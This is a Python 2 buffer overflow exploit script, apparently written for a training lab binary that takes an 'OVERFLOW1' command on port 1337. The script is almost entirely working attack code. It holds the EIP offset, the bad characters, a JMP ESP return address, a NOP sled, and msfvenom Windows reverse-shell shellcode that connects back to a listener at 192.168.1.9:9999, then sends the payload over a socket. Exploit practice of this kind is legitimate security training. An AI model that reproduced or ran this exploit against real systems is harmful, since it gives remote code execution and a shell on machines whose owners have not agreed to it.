#!/usr/bin/python2.7


import socket 
import sys


# size = 2000
host = "192.168.1.4"
port = 1337
payload=""
try :
	
	# badchars = \x00\x07\x2e\xa0
	# jmp esp 625011DF ==> \xDF\x11\x50\x62
	print "Trying ...\n"
	prefix  = "OVERFLOW1 "
	offset = 1978
	payload +=  prefix
	payload += "A"*offset
	payload += "\xdf\x11\x50\x62"  # new  EIP
	payload += "\x90"*16
		
	# print payload

	# payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
	# EIP :6F43396E 
	# [*] Exact match at offset 1978

	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.9 LPORT=9999  -b "\x00\x07\x2e\xa0" -f py    
	buf =  b""
	buf += b"\xd9\xec\xbf\x38\xb9\x6d\x97\xd9\x74\x24\xf4\x5b\x29"
	buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x7b\x13\x03\x43\xaa\x8f"
	buf += b"\x62\x4f\x24\xcd\x8d\xaf\xb5\xb2\x04\x4a\x84\xf2\x73"
	buf += b"\x1f\xb7\xc2\xf0\x4d\x34\xa8\x55\x65\xcf\xdc\x71\x8a"
	buf += b"\x78\x6a\xa4\xa5\x79\xc7\x94\xa4\xf9\x1a\xc9\x06\xc3"
	buf += b"\xd4\x1c\x47\x04\x08\xec\x15\xdd\x46\x43\x89\x6a\x12"
	buf += b"\x58\x22\x20\xb2\xd8\xd7\xf1\xb5\xc9\x46\x89\xef\xc9"
	buf += b"\x69\x5e\x84\x43\x71\x83\xa1\x1a\x0a\x77\x5d\x9d\xda"
	buf += b"\x49\x9e\x32\x23\x66\x6d\x4a\x64\x41\x8e\x39\x9c\xb1"
	buf += b"\x33\x3a\x5b\xcb\xef\xcf\x7f\x6b\x7b\x77\x5b\x8d\xa8"
	buf += b"\xee\x28\x81\x05\x64\x76\x86\x98\xa9\x0d\xb2\x11\x4c"
	buf += b"\xc1\x32\x61\x6b\xc5\x1f\x31\x12\x5c\xfa\x94\x2b\xbe"
	buf += b"\xa5\x49\x8e\xb5\x48\x9d\xa3\x94\x04\x52\x8e\x26\xd5"
	buf += b"\xfc\x99\x55\xe7\xa3\x31\xf1\x4b\x2b\x9c\x06\xab\x06"
	buf += b"\x58\x98\x52\xa9\x99\xb1\x90\xfd\xc9\xa9\x31\x7e\x82"
	buf += b"\x29\xbd\xab\x05\x79\x11\x04\xe6\x29\xd1\xf4\x8e\x23"
	buf += b"\xde\x2b\xae\x4c\x34\x44\x45\xb7\xdf\xab\x32\xb6\x16"
	buf += b"\x44\x41\xb8\x0f\x9b\xcc\x5e\x25\xb3\x98\xc9\xd2\x2a"
	buf += b"\x81\x81\x43\xb2\x1f\xec\x44\x38\xac\x11\x0a\xc9\xd9"
	buf += b"\x01\xfb\x39\x94\x7b\xaa\x46\x02\x13\x30\xd4\xc9\xe3"
	buf += b"\x3f\xc5\x45\xb4\x68\x3b\x9c\x50\x85\x62\x36\x46\x54"
	buf += b"\xf2\x71\xc2\x83\xc7\x7c\xcb\x46\x73\x5b\xdb\x9e\x7c"
	buf += b"\xe7\x8f\x4e\x2b\xb1\x79\x29\x85\x73\xd3\xe3\x7a\xda"
	buf += b"\xb3\x72\xb1\xdd\xc5\x7a\x9c\xab\x29\xca\x49\xea\x56"
	buf += b"\xe3\x1d\xfa\x2f\x19\xbe\x05\xfa\x99\xce\x4f\xa6\x88"
	buf += b"\x46\x16\x33\x89\x0a\xa9\xee\xce\x32\x2a\x1a\xaf\xc0"
	buf += b"\x32\x6f\xaa\x8d\xf4\x9c\xc6\x9e\x90\xa2\x75\x9e\xb0"
                                                                
	payload += buf

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,port))
	s.send(payload)
	print "[+] Payload has been sent successfully"
	s.close()

except :
	print "[+] Host is down "
	sys.exit()